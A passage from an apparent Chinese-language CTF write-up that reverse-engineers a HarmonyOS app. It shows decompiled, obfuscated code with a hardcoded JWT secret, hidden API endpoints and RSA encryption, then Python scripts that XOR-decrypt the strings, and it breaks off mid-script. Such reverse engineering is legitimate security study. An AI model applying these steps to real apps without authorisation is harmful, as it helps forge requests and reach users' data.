Multi-variable type inference failed */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;@<span class="number">4</span>*#(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        i = <span class="string">&quot;&#123;\&quot;data\&quot;:\&quot;&quot;</span> + arg0 + <span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">        ldlexvar = _lexenv_0_0_;</span><br><span class="line">        obj = ldlexvar.request;</span><br><span class="line">        ldlexvar2 = _lexenv_0_1_;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;method&quot;</span>, <span class="number">0</span>, <span class="string">&quot;extraData&quot;</span>, <span class="number">0</span>, <span class="string">&quot;header&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj2.method = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as http &#125; from <span class="string">&quot;@ohos:net.http&quot;</span>.RequestMethod.POST;</span><br><span class="line">        obj2.extraData = i;</span><br><span class="line">        obj3 = createobjectwithbuffer([<span class="string">&quot;Authorization&quot;</span>, <span class="number">0</span>, <span class="string">&quot;X-Sign&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/ apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>]);</span><br><span class="line">        ldlexvar3 = _lexenv_1_0_;</span><br><span class="line">        obj4 = ldlexvar3.o0OO00O;</span><br><span class="line">        ldlexvar4 = _lexenv_0_2_;</span><br><span class="line">        ldlexvar5 = _lexenv_1_0_;</span><br><span class="line">        obj3.Authorization = obj4(ldlexvar4, ldlexvar5.oo0Oo0(_lexenv_1_0_.Secret));</span><br><span class="line">        CryptoJS = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as CryptoJS &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;@ohos/crypto-js/index&amp;2.0.0&quot;</span>;</span><br><span class="line">        MD5 = CryptoJS.MD5(i);</span><br><span class="line">        obj3.X-Sign = MD5.toString();</span><br><span class="line">        obj2.header = obj3;</span><br><span class="line">        callthisN = obj(ldlexvar2, obj2);</span><br><span class="line">        callthisN.then(#~@<span class="number">0</span>&lt;@<span class="number">4</span>**#);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;@<span class="number">2</span>**#(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isfalse(arg0) == <span class="literal">null</span>) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        ldlexvar = _lexenv_2_0_;</span><br><span class="line">        RrrrRRR = ldlexvar.RrrrRRR(arg1.pubKey, _lexenv_0_0_);</span><br><span class="line">        RrrrRRR.then(#~@<span class="number">0</span>&lt;@<span class="number">2</span>***#);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;@<span class="number">4</span>**#(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        obj;</span><br><span class="line">        obj2;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">import</span> &#123; <span class="keyword">default</span> as http &#125; from <span class="string">&quot;@ohos:net.http&quot;</span>.ResponseCode.OK == arg0.responseCode ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            promptAction = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as promptAction &#125; from <span class="string">&quot;@ohos:promptAction&quot;</span>;</span><br><span class="line">            obj3 = promptAction.showToast;</span><br><span class="line">            obj4 = createobjectwithbuffer([<span class="string">&quot;message&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">            obj5 = arg0.result;</span><br><span class="line">            obj4.message = obj5.toString();</span><br><span class="line">            obj3(obj4);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        obj6 = console.log;</span><br><span class="line">        JSON = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as JSON &#125; from <span class="string">&quot;@ohos:util.json&quot;</span>;</span><br><span class="line">        obj7 = JSON.parse;</span><br><span class="line">        obj8 = arg0.result;</span><br><span class="line">        callthisN = obj7(obj8.toString());</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> != callthisN ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span> || (<span class="number">0</span> != callthisN ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            obj = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ldlexvar = _lexenv_1_0_;</span><br><span class="line">            obj = callthisN[ldlexvar.oo0Oo0(<span class="string">&quot;W_UR&quot;</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        obj6(obj);</span><br><span class="line">        JSON2 = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as JSON &#125; from <span class="string">&quot;@ohos:util.json&quot;</span>;</span><br><span class="line">        obj9 = JSON2.parse;</span><br><span class="line">        obj10 = arg0.result;</span><br><span class="line">        callthisN2 = obj9(obj10.toString());</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> != callthisN2 ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span> || (<span class="number">0</span> != callthisN2 ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            obj2 = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ldlexvar2 = _lexenv_1_0_;</span><br><span class="line">            obj2 = callthisN2[ldlexvar2.oo0Oo0(<span class="string">&quot;W_UR&quot;</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        obj11 = obj2;</span><br><span class="line">        promptAction2 = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as promptAction &#125; from <span class="string">&quot;@ohos:promptAction&quot;</span>;</span><br><span class="line">        obj12 = promptAction2.showToast;</span><br><span class="line">        obj13 = createobjectwithbuffer([<span class="string">&quot;message&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj13.message = obj11;</span><br><span class="line">        obj12(obj13);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;@<span class="number">2</span>***#(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        _lexenv_0_1_(arg0);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>=#utils(Object functionObject, Object newTarget, utils <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">func_main_0</span><span class="params">(Object functionObject, Object newTarget, utils <span class="built_in">this</span>)</span> &#123;</span><br><span class="line">        newlexenvwithname = newlexenvwithname([<span class="number">1</span>, <span class="string">&quot;utils&quot;</span>, <span class="number">0</span>], <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            obj = hole.#~@<span class="number">0</span>=#utils(Object2, Object3, hole, [<span class="string">&quot;oo0Oo0&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/common/Utils/utils&amp;.#~@0&lt;#oo0Oo0&quot;</span>, <span class="number">1</span>, <span class="string">&quot;RrrrRRR&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/common/Utils/utils&amp;.#~@0&lt;#RrrrRRR&quot;</span>, <span class="number">2</span>, <span class="string">&quot;rRrrrRR&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/common/Utils/utils&amp;.#~@0&lt;#rRrrrRR&quot;</span>, <span class="number">2</span>, <span class="string">&quot;o0O0OOoo&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/common/Utils/utils&amp;.#~@0&lt;#o0O0OOoo&quot;</span>, <span class="number">1</span>, <span class="string">&quot;l1Lll1&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/common/Utils/utils&amp;.#~@0&lt;#l1Lll1&quot;</span>, <span class="number">1</span>, <span class="string">&quot;o0OO00O&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/common/Utils/utils&amp;.#~@0&lt;#o0OO00O&quot;</span>, <span class="number">2</span>, <span class="number">0</span>]);</span><br><span class="line">            _lexenv_0_0_ = obj;</span><br><span class="line">            obj2 = obj.prototype;</span><br><span class="line">            obj.#~@<span class="number">0</span>&gt;#static_initializer();</span><br><span class="line">            newlexenvwithname = obj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExceptionI0 unused) &#123;</span><br><span class="line">            poplexenv();</span><br><span class="line">            <span class="keyword">throw</span>(newlexenvwithname);</span><br><span class="line">        &#125;</span><br><span class="line">        poplexenv();</span><br><span class="line">        _module_0_ = newlexenvwithname;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r16v14, types: [int] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r16v15, types: [Object, int] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r16v7, types: [Object, int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;#l1Lll1(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">5</span>, <span class="string">&quot;req&quot;</span>, <span class="number">0</span>, <span class="string">&quot;url2&quot;</span>, <span class="number">1</span>, <span class="string">&quot;uuid&quot;</span>, <span class="number">2</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">3</span>, <span class="string">&quot;this&quot;</span>, <span class="number">4</span>], <span class="number">5</span>);</span><br><span class="line">        _lexenv_0_3_ = newTarget;</span><br><span class="line">        _lexenv_0_4_ = <span class="built_in">this</span>;</span><br><span class="line">        _lexenv_0_2_ = arg0;</span><br><span class="line">        i = <span class="string">&quot;http://&quot;</span> + global.ip;</span><br><span class="line">        ldlexvar = _lexenv_1_0_;</span><br><span class="line">        _lexenv_0_1_ = (i + ldlexvar.oo0Oo0(<span class="string">&quot;\u001eRD\\\u001dD\u0000\u001dTTGRYSU&quot;</span>));</span><br><span class="line">        http = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as http &#125; from <span class="string">&quot;@ohos:net.http&quot;</span>;</span><br><span class="line">        _lexenv_0_0_ = http.createHttp();</span><br><span class="line">        ldlexvar2 = _lexenv_1_0_;</span><br><span class="line">        oo0Oo0 = ldlexvar2.oo0Oo0(<span class="string">&quot;|z&#125;w&#123;Xp|qVXE]Y[v\u000bD\u0001qudwtps|rre\rs\u007fx&#123;qrT\u007fvscts\u0005ykF\u0004~a~J\u0001@\n\u0003YaD\u0001B\u0004K9\\DFUH\u001dyFDc[Fw\u0006\u0001guxsxaJ\u0007h\u0006]aGqGd[p[Dtd|\u0002\u0007\u0001dXYG&#125;RPsAB~\u0005K@F|ZFYtW|\u007f?A\u0006~aG\u0006cN&#125;dKV^XVDl\u0002j\u0002\u0005Cukxzzkkua\u0005d^\u001fRhP\u0004jkFZe\ruQwCUtYV~P~[DVVfc@@8y\u0006@G\u0000&#123;Ea&#123;&#123;&#125;ZeX\\xhCrYU~gaM~t\u0000\u0019^Fup\u007fdF\u0004q|`q\u001bS@tAA\u001cd\u0006\u001fzAB[\u007ftpeSz`P_8\n\bfAL\u000bykAt`Dl\u0007W\u0019\u007fDExr@y|Sf\u0003_HPd\u0005jf`[k_[Y\u001eY\u0003\u001aU\u000b|tg\u0005\u0003fAgiEDAw@vdsD;x\u001b\\|PrubUxe\u0002\u0005x\u001eVv~\u0000mrkzzww\u0003d\u007fXsBuur\u0001_zb]G\u0006\u0004\u000bu\u0003PvzJ~EfdDs|cE\u001eqp\u0000@&gt;aE&#123;usbpq&quot;</span>);</span><br><span class="line">        ldlexvar3 = _lexenv_1_0_;</span><br><span class="line">        oo0Oo02 = ldlexvar3.oo0Oo0(<span class="string">&quot;J\u0011UVF[^\\\u0011\u000b\u0011SPFT]ST\u0013N&quot;</span>);</span><br><span class="line">        ldlexvar4 = _lexenv_1_0_;</span><br><span class="line">        rRrrrRR = ldlexvar4.rRrrrRR(oo0Oo02, oo0Oo0);</span><br><span class="line">        rRrrrRR.then(#~@<span class="number">0</span>&lt;@<span class="number">4</span>*#);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;#oo0Oo0(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">3</span>, <span class="string">&quot;keyChars&quot;</span>, <span class="number">0</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">1</span>, <span class="string">&quot;this&quot;</span>, <span class="number">2</span>], <span class="number">3</span>);</span><br><span class="line">        _lexenv_0_1_ = newTarget;</span><br><span class="line">        _lexenv_0_2_ = <span class="built_in">this</span>;</span><br><span class="line">        from = Array.from(arg0);</span><br><span class="line">        _lexenv_0_0_ = Array.from(<span class="string">&quot;134522123&quot;</span>);</span><br><span class="line">        map = from.map(#~@<span class="number">0</span>&lt;@<span class="number">1</span>*#);</span><br><span class="line">        <span class="keyword">return</span> map.join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r20v16, types: [Object, java.lang.Class] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;#RrrrRRR(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        asyncfunctionenter = asyncfunctionenter();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cryptoFramework = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as cryptoFramework &#125; from <span class="string">&quot;@ohos:security.cryptoFramework&quot;</span>;</span><br><span class="line">            obj = cryptoFramework.createCipher;</span><br><span class="line">            ldlexvar = _lexenv_0_0_;</span><br><span class="line">            callthisN = obj(ldlexvar.oo0Oo0(<span class="string">&quot;c`u\u0007\u0002\u0006\tNczpg\u0004&quot;</span>));</span><br><span class="line">            newobjrange = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as util &#125; from <span class="string">&quot;@ohos:util&quot;</span>.Base64Helper();</span><br><span class="line">            suspendgenerator(asyncfunctionenter, asyncfunctionawaituncaught(asyncfunctionenter, callthisN.init(<span class="keyword">import</span> &#123; <span class="keyword">default</span> as cryptoFramework &#125; from <span class="string">&quot;@ohos:security.cryptoFramework&quot;</span>.CryptoMode.ENCRYPT_MODE, arg0, <span class="number">0</span>)));</span><br><span class="line">            resumegenerator = resumegenerator(asyncfunctionenter);</span><br><span class="line">            <span class="keyword">if</span> ((<span class="number">1</span> == getresumemode(asyncfunctionenter) ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span>(resumegenerator);</span><br><span class="line">            &#125;</span><br><span class="line">            suspendgenerator(asyncfunctionenter, asyncfunctionawaituncaught(asyncfunctionenter, callthisN.doFinal(arg1)));</span><br><span class="line">            resumegenerator2 = resumegenerator(asyncfunctionenter);</span><br><span class="line">            <span class="keyword">if</span> ((<span class="number">1</span> == getresumemode(asyncfunctionenter) ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span>(resumegenerator2);</span><br><span class="line">            &#125;</span><br><span class="line">            asyncfunctionenter = asyncfunctionresolve(newobjrange.encodeToStringSync(resumegenerator2.data), asyncfunctionenter);</span><br><span class="line">            <span class="keyword">return</span> asyncfunctionenter;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExceptionI0 unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> asyncfunctionreject(asyncfunctionenter, asyncfunctionenter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;#o0OO00O(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        jwt = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as jwt &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;@ohos/jsonwebtoken/index&amp;1.0.1&quot;</span>;</span><br><span class="line">        obj = jwt.sign;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;sub&quot;</span>, <span class="string">&quot;1234567890&quot;</span>, <span class="string">&quot;uid&quot;</span>, <span class="number">0</span>, <span class="string">&quot;iat&quot;</span>, <span class="number">1516239022</span>]);</span><br><span class="line">        obj2.uid = arg0;</span><br><span class="line">        <span class="keyword">return</span> obj(obj2, arg1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;#rRrrrRR(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">4</span>, <span class="string">&quot;pk&quot;</span>, <span class="number">0</span>, <span class="string">&quot;message&quot;</span>, <span class="number">1</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">2</span>, <span class="string">&quot;this&quot;</span>, <span class="number">3</span>], <span class="number">4</span>);</span><br><span class="line">        _lexenv_0_2_ = newTarget;</span><br><span class="line">        _lexenv_0_3_ = <span class="built_in">this</span>;</span><br><span class="line">        _lexenv_0_1_ = arg0;</span><br><span class="line">        _lexenv_0_0_ = arg1;</span><br><span class="line">        <span class="keyword">return</span> Promise(#~@<span class="number">0</span>&lt;@<span class="number">2</span>*#);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r24v13, types: [int] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r24v6, types: [Object, int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;#o0O0OOoo(Object functionObject, Object newTarget, utils <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">2</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">0</span>, <span class="string">&quot;this&quot;</span>, <span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">        _lexenv_0_0_ = newTarget;</span><br><span class="line">        _lexenv_0_1_ = <span class="built_in">this</span>;</span><br><span class="line">        i = <span class="string">&quot;http://&quot;</span> + global.ip;</span><br><span class="line">        ldlexvar = _lexenv_1_0_;</span><br><span class="line">        oo0Oo0 = i + ldlexvar.oo0Oo0(<span class="string">&quot;\u001eRD\\\u001dD\u0000\u001dP^]@TQFB\rFXW\t&quot;</span>) + arg0;</span><br><span class="line">        http = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as http &#125; from <span class="string">&quot;@ohos:net.http&quot;</span>;</span><br><span class="line">        createHttp = http.createHttp();</span><br><span class="line">        obj = createHttp.request;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;method&quot;</span>, <span class="number">0</span>, <span class="string">&quot;header&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj2.method = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as http &#125; from <span class="string">&quot;@ohos:net.http&quot;</span>.RequestMethod.GET;</span><br><span class="line">        obj3 = createobjectwithbuffer([<span class="string">&quot;Authorization&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        ldlexvar2 = _lexenv_1_0_;</span><br><span class="line">        obj4 = ldlexvar2.o0OO00O;</span><br><span class="line">        ldlexvar3 = _lexenv_1_0_;</span><br><span class="line">        obj3.Authorization = obj4(arg0, ldlexvar3.oo0Oo0(_lexenv_1_0_.Secret));</span><br><span class="line">        obj2.header = obj3;</span><br><span class="line">        callthisN = obj(oo0Oo0, obj2);</span><br><span class="line">        callthisN.then(#~@<span class="number">0</span>&lt;@<span class="number">3</span>*#);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#static_initializer(Object functionObject, Object newTarget, utils <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.Secret = <span class="string">&quot;FpBz\u0001ecH\n\u001bEzx\u0017@|SrAXQGkloXz\u0007ElXZ&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.uuuuu = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得出几段密文信息，写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_path</span>(<span class="params">encrypted_str, key</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key_repeated = (key * (<span class="built_in">len</span>(encrypted_str) // <span class="built_in">len</span>(key) + <span class="number">1</span>))[:<span class="built_in">len</span>(encrypted_str)]</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_str):</span><br><span class="line">        dec_char = <span class="built_in">ord</span>(char) ^ <span class="built_in">ord</span>(key_repeated[i])</span><br><span class="line">        decrypted.append(<span class="built_in">chr</span>(dec_char))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line">encrypted = <span class="string">&quot;\u001eRD\\\u001dD\u0000\u001dTTGRYSU&quot;</span></span><br><span class="line">key = <span class="string">&quot;134522123&quot;</span></span><br><span class="line">path = decrypt_path(encrypted, key)</span><br><span class="line"><span class="built_in">print</span>(path)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">\u001eRD\\\u001dD\u0000\u001dP^]@TQFB\rFXW\t</span><br><span class="line">/api/v1/contacts?uid=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\u001eRD\\\u001dD\u0000\u001dTTGRYSU</span><br><span class="line">/api/v1/getflag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">J\u0011UVF[^\\\u0011\u000b\u0011SPFT]ST\u0013N</span><br><span class="line">&#123;&quot;action&quot;:&quot;getflag&quot;&#125;</span><br><span class="line"></span><br><span class="line">c`u\u0007\u0002\u0006\tNczpg\u0004</span><br><span class="line">RSA2048|PKCS1</span><br><span class="line"></span><br><span class="line">W_UR</span><br><span class="line">flag</span><br></pre></td></tr></table></figure><p>并且也给出了RSA公钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.serialization <span class="keyword">import</span> load_der_public_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_string</span>(<span class="params">encrypted_str, key=<span class="string">&quot;134522123&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解密字符串 - 模拟utils.oo0Oo0方法&quot;&quot;&quot;</span></span><br><span class="line">    key_chars = <span class="built_in">list</span>(key)</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_str):</span><br><span class="line">        key_char = key_chars[i % <span class="built_in">len</span>(key_chars)]</span><br><span class="line">        decrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ <span class="built_in">ord</span>(key_char))</span><br><span class="line">        result += decrypted_char</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_rsa_public_key</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;提取和解析RSA公钥&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 🎯 从utils类中提取的长加密字符串</span></span><br><span class="line">    encrypted_key = <span 